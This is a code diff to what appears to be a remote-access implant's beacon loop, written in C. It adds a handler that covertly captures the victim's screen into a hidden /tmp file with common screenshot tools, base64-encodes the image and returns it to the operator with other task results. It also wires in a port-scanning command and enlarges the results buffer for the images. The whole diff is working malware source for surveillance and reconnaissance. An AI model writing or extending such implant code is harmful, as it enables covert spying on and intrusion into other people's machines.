@@ -94,6 +94,8 @@ static ssize_t tls_recv_wrapper(SSL *ssl, int sock, void *buf, size_t len) {
 #include "evasion_linux.h"
 #endif
 
+#include "portscan.h"
+
 /* ── Globals ─────────────────────────────────────────────── */
 
 static int  g_sleep_ms   = 5000;
@@ -477,6 +479,60 @@ static void handle_download(const char *path, char *out_b64) {
     free(buf);
 }
 
+/* Handle 'screenshot' - capture screen via available tools */
+static void handle_screenshot_posix(char *out_b64, size_t out_cap) {
+    const char *tmpfile = "/tmp/.apex_ss.bmp";
+    const char *cmds[] = {
+        "DISPLAY=:0 import -window root -resize 640 /tmp/.apex_ss.bmp 2>/dev/null",
+        "DISPLAY=:0 scrot -o /tmp/.apex_ss.bmp 2>/dev/null",
+        "DISPLAY=:0 xwd -root 2>/dev/null | convert xwd:- /tmp/.apex_ss.bmp 2>/dev/null",
+#ifdef __APPLE__
+        "screencapture -x /tmp/.apex_ss.bmp 2>/dev/null",
+#endif
+        NULL
+    };
+
+    int captured = 0;
+    for (int i = 0; cmds[i]; i++) {
+        if (system(cmds[i]) == 0) {
+            struct stat st;
+            if (stat(tmpfile, &st) == 0 && st.st_size > 0) {
+                captured = 1;
+                break;
+            }
+        }
+    }
+
+    if (!captured) {
+        b64_encode((unsigned char*)"No screenshot tool available (install scrot or imagemagick)", 59, out_b64);
+        return;
+    }
+
+    FILE *f = fopen(tmpfile, "rb");
+    if (!f) {
+        b64_encode((unsigned char*)"Failed to read screenshot file", 30, out_b64);
+        return;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long sz = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    unsigned char *data = (unsigned char *)malloc((size_t)sz);
+    if (!data) { fclose(f); unlink(tmpfile); b64_encode((unsigned char*)"Out of memory", 13, out_b64); return; }
+    size_t nread = fread(data, 1, (size_t)sz, f);
+    fclose(f);
+    unlink(tmpfile);
+
+    size_t b64_needed = (nread + 2) / 3 * 4 + 1;
+    if (b64_needed < out_cap)
+        b64_encode(data, nread, out_b64);
+    else
+        b64_encode((unsigned char*)"Screenshot too large for buffer", 31, out_b64);
+
+    free(data);
+}
+
 /* Handle 'upload' - write file to target disk.
    Decoded args format: "<remote_path>\n<base64_file_data>" */
 static void handle_upload(const char *args, char *out_b64) {
@@ -679,7 +735,7 @@ static void run_beacon(void) {
         if (task_count == 0) goto do_sleep;
 
         /* Allocate results buffer for all tasks */
-        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256;
+        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256 + (4 * 1024 * 1024);
         char *results = (char *)malloc(results_cap);
         if (!results) goto do_sleep;
         size_t roff = 0;
@@ -715,6 +771,21 @@ static void run_beacon(void) {
                 handle_download(args_decoded, out_b64);
             } else if (strcmp(tasks[t].command, "upload") == 0) {
                 handle_upload(args_decoded, out_b64);
+            } else if (strcmp(tasks[t].command, "screenshot") == 0) {
+                char *ss_buf = (char *)malloc(2 * 1024 * 1024);
+                if (ss_buf) {
+                    ss_buf[0] = '\0';
+                    handle_screenshot_posix(ss_buf, 2 * 1024 * 1024);
+                    if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
+                    roff += (size_t)snprintf(results + roff, results_cap - roff,
+                        "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}",
+                        tasks[t].id, ss_buf);
+                    free(ss_buf);
+                    continue;
+                }
+                b64_encode((unsigned char*)"Out of memory for screenshot", 28, out_b64);
+            } else if (strcmp(tasks[t].command, "portscan") == 0) {
+                handle_portscan(args_decoded, out_b64, BUF_SIZE);
             } else if (strcmp(tasks[t].command, "exit") == 0) {
                 b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                 should_exit = 1;
